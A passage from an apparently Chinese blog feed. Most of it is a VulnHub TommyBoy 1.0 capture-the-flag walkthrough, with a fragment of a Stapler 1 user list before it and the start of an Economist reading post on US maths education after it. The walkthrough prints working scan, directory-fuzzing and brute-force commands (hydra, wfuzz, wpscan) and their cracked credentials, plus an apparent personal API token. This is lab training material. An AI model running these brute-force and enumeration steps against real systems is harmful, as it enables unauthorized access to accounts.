<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\peter (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\RNunemaker (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\ETollefson (Local User)</span><br><span class="line">S-1-22-1-1003 Unix User\DSwanger (Local User)</span><br><span class="line">S-1-22-1-1004 Unix User\AParnell (Local User)</span><br><span class="line">S-1-22-1-1005 Unix User\SHayslett (Local User)</span><br><span class="line">S-1-22-1-1006 Unix User\MBassin (Local User)</span><br><span class="line">S-1-22-1-1007 Unix User\JBare (Local User)</span><br><span class="line">S-1-22-1-1008 Unix User\LSolum (Local User)</span><br><span class="line">S-1-22-1-1009 Unix User\IChadwick (Local User)</span><br><span class="line">S-1-22-1-1010 Unix User\MFrei (Local User)</span><br><span class="line">S-1-22-1-1011 Unix User\SStroud (Local User)</span><br><span class="line">S-1-22-1-1012 Unix User\CCeaser (Local User)</span><br><span class="line">S-1-22-1-1013 Unix User\JKanode (Local User)</span><br><span class="line">S-1-22-1-1014 Unix User\CJoo (Local User)</span><br><span class="line">S-1-22-1-1015 Unix User\Eeth (Local User)</span><br><span class="line">S-1-22-1-1016 Unix User\LSolum2 (Local User)</span><br><span class="line">S-1-22-1-1017 Unix User\JLipps (Local User)</span><br><span class="line">S-1-22-1-1018 Unix User\jamie (Local User)</span><br><span class="line">S-1-22-1-1019 Unix User\Sam (Local User)</span><br><span class="line">S-1-22-1-1020 Unix User\Drew (Local User)</span><br><span class="line">S-1-22-1-1021 Unix User\jess (Local User)</span><br><span class="line">S-1-22-1-1022 Unix User\SHAY (Local User)</span><br><span class="line">S-1-22-1-1023 Unix User\Taylor (Local User)</span><br><span class="line">S-1-22-1-1024 Unix User\mel (Local User)</span><br><span class="line">S-1-22-1-1025 Unix User\kai (Local User)</span><br><span class="line">S-1-22-1-1026 Unix User\zoe (Local User)</span><br><span class="line">S-1-22-1-1027 Unix User\NATHAN (Local User)</span><br><span class="line">S-1-22-1-1028 Unix User\www (Local User)</span><br><span class="line">S-1-22-1-1029 Unix User\elly (Local User)</span><br></pre></td></tr></table></figure>
<p>最终获取到这些本地用户名。<br><a href="https://www.mrb3n.com/?p=81">待续</a></p>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Stapler 1</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之TommyBoy1dot0</title>
    <url>//posts/ZH-CN/Vulnhub_TommyBoy1.0.html</url>
    <content><![CDATA[<h2 id="搭建靶机环境"><a href="#搭建靶机环境" class="headerlink" title="搭建靶机环境"></a>搭建靶机环境</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0pjxaba7j30e408q0ss.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0qq9ca3rj31f60u0mzc.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><ol>
<li>攻击机IP查询<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# ip addr show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:b5:c3:a6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.80.123/24 brd 192.168.80.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:feb5:c3a6/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure></li>
<li>使用<code>arp-scan -l</code>探测靶机IP，我们发现靶机的IP是192.168.80.13。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.80.2	00:50:56:fc:96:a7	VMware, Inc.</span><br><span class="line">192.168.80.13	00:0c:29:36:78:84	VMware, Inc.</span><br><span class="line">192.168.80.254	00:50:56:fa:63:60	VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 1.962 seconds (130.48 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure></li>
<li>使用<code>masscan</code>探测开启的端口信息<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# masscan -p1-65535 192.168.80.13/32 --rate=10000                 </span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-18 10:52:45 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 192.168.80.13                                   </span><br><span class="line">Discovered open port 80/tcp on 192.168.80.13                                   </span><br><span class="line">Discovered open port 8008/tcp on 192.168.80.13  </span><br></pre></td></tr></table></figure></li>
<li>接下来使用<code>nmap</code>深度扫描，发现端口对应的服务是<code>22端口：ssh</code>、<code>80和8008端口：http</code>。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap 192.168.80.13 -p22,80,8008</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-18 19:00 CST</span><br><span class="line">Nmap scan report for 192.168.80.13</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8008/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:36:78:84 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds</span><br></pre></td></tr></table></figure></li>
<li>使用<code>nikto</code>扫描web漏洞<br>nikto是什么？<a href="https://blog.bbskali.cn/index.php/archives/304/">参考资料</a><blockquote>
<p>NIKTO:perl语言开发的开源WEB安全扫描器；识别网站软件版本；搜索存在安全隐患的文件；检查服务器配置漏洞；检查WEB Application层面的安全隐患；避免404误判依据响应文件内容判断，不同扩展名的文件404响应内容不同。</p>
</blockquote>
</li>
</ol>
<ul>
<li>扫描80端口，发现了重要信息</li>
</ul>
<p>命令用法：<br><code>nikto -host 192.168.80.13 -port 80</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ Entry &#x27;/lukeiamyourfather/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.</span><br><span class="line">+ Entry &#x27;/lookalivelowbridge/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ Entry &#x27;/flag-numero-uno.txt&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ &quot;robots.txt&quot; contains 4 entries which should be manually viewed.</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /aspnet_client over HTTP/1.0. The value is &quot;127.0.1.1&quot;.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 498, size: 5371fb88ff1d8, mtime: gzip</span><br><span class="line">+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </span><br></pre></td></tr></table></figure>
<p>从输出结果中找到以上关键信息，发现网站存在这个入口<code>/flag-numero-uno.txt</code>，于是到浏览器输入url地址：<code>http://192.168.80.13/flag-numero-uno.txt</code>获取到第一个flag：<code>Flag data: B34rcl4ws</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0rs42a3vj30zi0nnt9u.jpg" alt="image.png"><br>6. 查看网页源码，找到关键信息，blog<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0s6a34wrj30zo0lsacv.jpg" alt="image.png"><br>要找到公司博客，得先看一个youtube视频：<code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code>。这个视频就一句话「Hey, prestoricforest」，猜测这个公司博客的url地址是<code>http://192.168.80.13/prehistoricforest/</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sgkznalj30zs0nzjus.jpg" alt="image.png"><br>7. 进入博客，我们发现第一篇博客的回复里面有flag提示信息：<code>Flag #2: thisisthesecondflagyayyou.txt</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sl4bxalj31f60quq82.jpg" alt="image.png"><br>于是我们通过提示，输入url：<code>http://192.168.80.13/prehistoricforest/thisisthesecondflagyayyou.txt</code>得到第二个flag：<code>Flag data: Z4l1nsky</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sp6d4gej31f60q6tbj.jpg" alt="image.png"><br>8. 进入<code>son of A</code>这篇博客，找到新的信息提示<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0srpwch7j31f60u0gs8.jpg" alt="image.png"><br>提示1：带锁的那篇博客的密码在这个目录：<code>http://192.168.80.13/richard</code>里面找。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0stsaln1j31f60u0n22.jpg" alt="image.png"><br>把这张图片下载到本地，exif这张图片，获得一串md5代码：<code>ce154b5a8e59c89732bc25d6a2e6b90b</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t2a9otzj30xz0gvwlk.jpg" alt="image.png"><br>使用<a href="https://www.cmd5.com/">在线工具</a>解密这串md5，得到的结果是：<code>spanky</code>，这就是那篇加密博客的访问密码了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t4kn702j31f60u0juz.jpg" alt="image.png"><br>使用密码访问这篇博客。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t60viqhj31f60u0jxd.jpg" alt="image.png"><br>用hydra对ftp账号<code>nickburns</code>做暴力破解，获取到密码：<code>nickburns</code>。–但是我并没扫描出65534端口:/<br>原来是这个端口的服务不稳定，时断时开。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# hydra -e nsr -l nickburns ftp://192.168.80.13:65534/</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-18 20:13:54</span><br><span class="line">[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task</span><br><span class="line">[DATA] attacking ftp://192.168.80.13:65534/</span><br><span class="line">[65534][ftp] host: 192.168.80.13   login: nickburns   password: nickburns</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-18 20:13:57</span><br></pre></td></tr></table></figure>
<p>输入用户名和密码登录ftp服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# ftp 192.168.80.13 65534</span><br><span class="line">Connected to 192.168.80.13.</span><br><span class="line">220 Callahan_FTP_Server 1.3.5</span><br><span class="line">Name (192.168.80.13:root): nickburns</span><br><span class="line">331 Password required for nickburns</span><br><span class="line">Password:</span><br><span class="line">230 User nickburns logged in</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
<p>查看这个ftp服务有哪些文件，可以看到有个readme.txt，我们把它get到本地。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> dir</span></span><br><span class="line">200 PORT command successful</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt</span><br><span class="line">226 Transfer complete</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get readme.txt</span></span><br><span class="line">local: readme.txt remote: readme.txt</span><br><span class="line">200 PORT command successful</span><br><span class="line">150 Opening BINARY mode data connection for readme.txt (977 bytes)</span><br><span class="line">226 Transfer complete</span><br><span class="line">977 bytes received in 0.10 secs (9.7746 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">bye</span></span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>
<p>我们看一下这个readme.txt写的啥，这里提示我们，有重要的信息放在<code>NickIzL33t</code>这个子目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat readme.txt </span><br><span class="line">To my replacement:</span><br><span class="line"></span><br><span class="line">If you&#x27;re reading this, you have the unfortunate job of taking over IT responsibilities</span><br><span class="line">from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You&#x27;ll be</span><br><span class="line">surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn&#x27;t know a fax machine</span><br><span class="line">from a flame thrower!</span><br><span class="line"></span><br><span class="line">Anyway I&#x27;m not completely without mercy.  There&#x27;s a subfolder called &quot;NickIzL33t&quot; on this server</span><br><span class="line">somewhere. I used it as my personal dropbox on the company&#x27;s dime for years.  Heh. LOL.</span><br><span class="line">I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want</span><br><span class="line">to look at on your phone later, consider that folder my gift to you.</span><br><span class="line"></span><br><span class="line">Oh by the way, Big Tom&#x27;s a moron and always forgets his passwords and so I made an encrypted</span><br><span class="line">.zip of his passwords and put them in the &quot;NickIzL33t&quot; folder as well.  But guess what?</span><br><span class="line">He always forgets THAT password as well.  Luckily I&#x27;m a nice guy and left him a hint sheet.</span><br><span class="line"></span><br><span class="line">Good luck, schmuck!</span><br><span class="line"></span><br><span class="line">LOL.</span><br><span class="line"></span><br><span class="line">-Nick</span><br></pre></td></tr></table></figure>
<p>于是我们访问这个url：<code>http://192.168.80.13:8008/NickIzL33t</code>，看到这样的结果。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc106lvx3ej30zh0nljst.jpg" alt="image.png"><br>当我们使用插件<code>User-Agent Switcher and Manager</code>修改UA为IOS时，页面显示结果变成这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc15ltgo9fj30zu0nlmyp.jpg" alt="image.png"><br>这是在提示我们要获取这个网站的密码，要找到一个html文件。于是我们爆破目录，去寻找相关的html。<br>思路1：使用burpsuite爆破<br>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /NickIzL33t/§page§.html HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:8008</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">If-Modified-Since: Fri, 15 Jul 2016 02:11:27 GMT</span><br><span class="line">If-None-Match: &quot;10e-537a322dc0ba6-gzip&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc37oafa7yj31ee0cuwg3.jpg" alt="image.png"><br>思路2：使用DirBuster爆破<br><a href="https://blog.csdn.net/l1028386804/article/details/85757875">DirBuster用法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc47r97molj30lj0f0gmw.jpg" alt="image.png"><br>思路3：使用dirb爆破（没成功）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.80.13:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt -a &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25&quot; -X .html</span><br></pre></td></tr></table></figure>
<p>思路4：使用wfuzz爆破<br><a href="https://www.icekam.com/post/wfuzz-web-blasting-and-exhaustive-tools/">wfuzz常见用法</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wfuzz -Z -c -v -w /usr/share/wordlists/rockyou.txt -H &quot;User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&quot; --hc 404 http://192.168.80.13:8008/NickIzL33t/FUZZ.html </span><br></pre></td></tr></table></figure>
<p>字典文件存在空格导致程序报错😭😭😭😭😭😭太难受了……<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3995ulb6j30on0ixq6o.jpg" alt="image.png"></p>
<p>使用crunch生成密码字典：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 13 13 -t bev,%%@@^1995 -o tommy.txt</span><br></pre></td></tr></table></figure>


<p>接下来我们用<code>wpscan --url http://192.168.80.13/prehistoricforest --enumerate u --api-token XLupJiXSlrJM4j1tUKggDoVYGzR7VqB9fsevFf9sfn0</code>来暴力破解网站的用户名。<br>得出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:01 &lt;===================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] tommy</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] richard</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Tom Jr.</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] Big Tom</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] michelle</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p> 解压rockyou.txt.gz这个压缩包，使用该字典进行暴力破解。<br> <code>kali@kali:/usr/share/wordlists$ sudo gzip -d rockyou.txt.gz</code>，注意这里要使用<code>sudo</code>权限。<br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc151tfb4uj30po04kdhs.jpg" alt="image.png"></p>
<p> <del>暴力破解待续……</del></p>
<p>继续使用<code>wpscan</code>暴力破解wordpress登录密码。太不容易了，找了好久才找到wpscan3.0以上版本的使用方法，<a href="https://soapffz.com/16.html">参考文章</a>。爆破tom的密码，爆出的密码是：<code>tomtom1</code>。<strong>可能没有人像我这样花两天时间爆破这么一个简单的密码😥</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo wpscan --url http://192.168.80.13/prehistoricforest/ --usernames tom --passwords /usr/share/wordlists/rockyou.txt --api-token XLupJiXSlrJM4j1tUKggDoVYGzR7VqB9fsevFf9sfn0 --max-threads 100</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.7.6</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.80.13/prehistoricforest/</span><br><span class="line">[+] Started: Thu Feb 20 03:29:20 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.5.20 identified (Latest, released on 2019-12-12).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.5.20&lt;/generator&gt;</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.5.20&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentysixteen</span><br><span class="line"> | Location: http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/</span><br><span class="line"> | Last Updated: 2019-05-07T00:00:00.000Z</span><br><span class="line"> | Readme: http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.0</span><br><span class="line"> | Style URL: http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.20</span><br><span class="line"> | Style Name: Twenty Sixteen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="line"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.20, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:03 &lt;=============================&gt; (21 / 21) 100.00% Time: 00:00:03</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Error: Server error, try reducing the number of threads.                                                  </span><br><span class="line">Trying tom / tomtom1 Time: 00:06:20 &lt;=============================&gt; (24700 / 24700) 100.00% Time: 00:06:20</span><br><span class="line">[SUCCESS] - tom / tomtom1                                                                                 </span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: tom, Password: tomtom1</span><br><span class="line"></span><br><span class="line">[+] WPVulnDB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 2</span><br><span class="line"> | Requests Remaining: 44</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Feb 20 03:37:19 2020</span><br><span class="line">[+] Requests Done: 24772</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 8.24 MB</span><br><span class="line">[+] Data Received: 107.827 MB</span><br><span class="line">[+] Memory used: 1.162 GB</span><br><span class="line">[+] Elapsed time: 00:07:59</span><br></pre></td></tr></table></figure>
<ul>
<li>wpscan参数说明<ul>
<li><code>--url</code>：wordpress网站的登录地址。</li>
<li><code>--passwords</code>：密码字典文件，这里我们使用kali自带的rockyou.txt字典。</li>
<li><code>--usernames</code>：可以是单个用户名，或者用户名字典文件。</li>
<li><code>--max-threads</code>：设置最大线程数，默认值是5（太小了，可能要暴力破解到世界毁灭），设置为100。</li>
<li><code>--api-token</code>：自己在wpscan官网申请的唯一的api token值，一天有50次免费使用机会。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>TommyBoy1dot0</tag>
      </tags>
  </entry>
  <entry>
    <title>美国数学教育：2+2=4就是种族主义者？</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-91day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-91天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>American competitiveness</p>
<p>美国人的竞争力</p>
<p>The maths wars</p>
<p>数学战役</p>
<p>How teaching times tables became another victim of America’s political divide</p>
<p>乘法表的教学方法成了美国政治分化的又一个受害者</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/gayatri-malhotra-4wF66_KWJxA-unsplash.jpg" alt="gayatri-malhotra-4wF66_KWJxA-unsplash.jpg"></p>
<p>本文略长，预计阅读时长23分钟。</p>
<p>这是一篇结构严谨的议论文，论述了美国数学教育的极端，总共10段，每一段的主题明确，论据充分，值得我们学习。以下是每段主题：</p>
<ol>
<li><p>Status quo: where to go next 现状：下一步举措</p>
</li>
<li><p>History of “New Math curriculum” “新数”的历史</p>
</li>
<li><p>Commission produced a report called “A Nation at risk” 委员会发布—“处于危险的国家”</p>
</li>
<li><p>Conservatives: classical maths 保守主义者：古典数学</p>
</li>
<li><p>Progressives: conceptual maths 进步主义者：概念数学</p>
</li>
<li><p>How to improve it? 如何提升数学？</p>
</li>
<li><p>The Common Core “共同核心”课程</p>
</li>
<li><p>Paired conceptual maths with racists 对比概念数学和种族主义</p>
</li>
<li><p>Paired conceptual maths with “social-justice maths” 对比概念数学和“社会正义数学”</p>
</li>
<li><p>Conclusion: polarized 总结：极端</p>
</li>
</ol>
<p>简单介绍文中提到的一些术语，以便更加理解本文观点。</p>
<p>新数</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/new-math-curriculum.png" alt="new-math-curriculum.png"></p>
<p>处于危险中的国家</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/A_Nation_at_Risk.jpg" alt="A_Nation_at_Risk.jpg"></p>
<p>“共同核心”课程</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/Common-Core.png" alt="Common-Core.png"></p>
<ol>
<li>Status quo: where to go next 现状：下一步举措</li>
</ol>
<p>America has a maths problem.</p>
